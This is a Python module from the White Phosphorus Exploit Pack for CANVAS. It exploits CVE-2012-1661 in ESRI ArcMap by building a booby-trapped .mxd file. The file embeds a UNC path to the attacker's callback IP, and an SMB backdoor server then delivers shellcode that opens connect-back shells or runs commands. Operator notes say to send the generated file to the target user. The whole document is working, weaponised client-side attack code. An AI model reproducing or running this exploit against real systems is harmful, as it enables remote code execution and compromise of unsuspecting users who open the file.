
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef 
from MOSDEF import pelib
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer
from libs.canvasos import canvasos


NAME = "ESRI ArcMap Unsanitized Clientside Script Execution"
DESCRIPTION = "Exploits an unsanitized script execution vulnerability in ESRI ArcMap"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='ESRI'
DOCUMENTATION["Date public"] = "2012-06-14"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="CVE-2012-1661"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1661'
DOCUMENTATION['CVSS'] = '10.0'
DOCUMENTATION["References"] = "http://www.osvdb.org/82986"
DOCUMENTATION["Notes"] = """
This is a client-side exploit - run the module and send the created file to the target user.

All payloads are served over SMB via wp_smbserver_backdoor. Windows based CANVAS users must first disable the native Windows SMB server before running the module. On Windows 7 this is done by disabling the 'Server' and 'TCP/IP NetBIOS Helper' services and rebooting the system.

Instructions:
1. Disable native SMB server and reboot
2. Run wp_esri_arcmap_unsanitizedscript
3. Send created file to target user
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]

NOTES="""
This is a client-side exploit - run the module and send the created file to the target user.

All payloads are served over SMB via wp_smbserver_backdoor. Windows based CANVAS users must first disable the native Windows SMB server before running the module. On Windows 7 this is done by disabling the 'Server' and 'TCP/IP NetBIOS Helper' services and rebooting the system.

Instructions:
1. Disable native SMB server and reboot
2. Run wp_esri_arcmap_unsanitizedscript
3. Send created file to target user

-------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> ESRI ArcMap Unsanitized Clientside Script Execution
-------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal

Payloads:
0 IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_esri_arcmap_unsanitizedscript/wp_esri_arcmap_unsanitizedscript.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        wp_exploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.badstring = "\x00\x0a\x0d\x20"
        self.alignstack = True
        self.filename= "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".mxd"
        self.vProtect = True
        self.useRawShellcode = True
        self.payloadFilename = "".join( [ random.choice(string.lowercase) for x in range(8) ] ) + '.exe'
        self.sharefilename = "\\"+ "".join( [ random.choice(string.lowercase) for x in range(4) ] ) + "\\" + self.payloadFilename
        return

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        self.wp_getShellcodeType()

        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return
    
    def makefile(self):
        filedata = open('3rdparty/White_Phosphorus/exploits/wp_esri_arcmap_unsanitizedscript/wp_esri_arcmap_unsanitizedscript_trigger.mxd','rb').read()
        payload = "\\\\" + self.callback.ip + self.sharefilename
        filedata = filedata.replace('\x20'*250, payload + '\x20'*(250-len(payload)))
        return filedata

    def run(self):
        filedata=self.makefile()
        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening %s for output"%outputfile)
        
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(outputfile))
        
        self.log("WP> Starting wp_smbserver_backdoor to host payload")
        try:
            app=self.engine.getModuleExploit("wp_smbserver_backdoor")
            app.link(self)
            app.argsDict['sharefilename'] = self.sharefilename
            app.argsDict['trojanPayload'] = self.shellcode
            ret=app.run()
        except:
            self.log("WP> Unable to start wp_smbserver_backdoor - port 443 already bound?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return None,None
        time.sleep(5)

        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
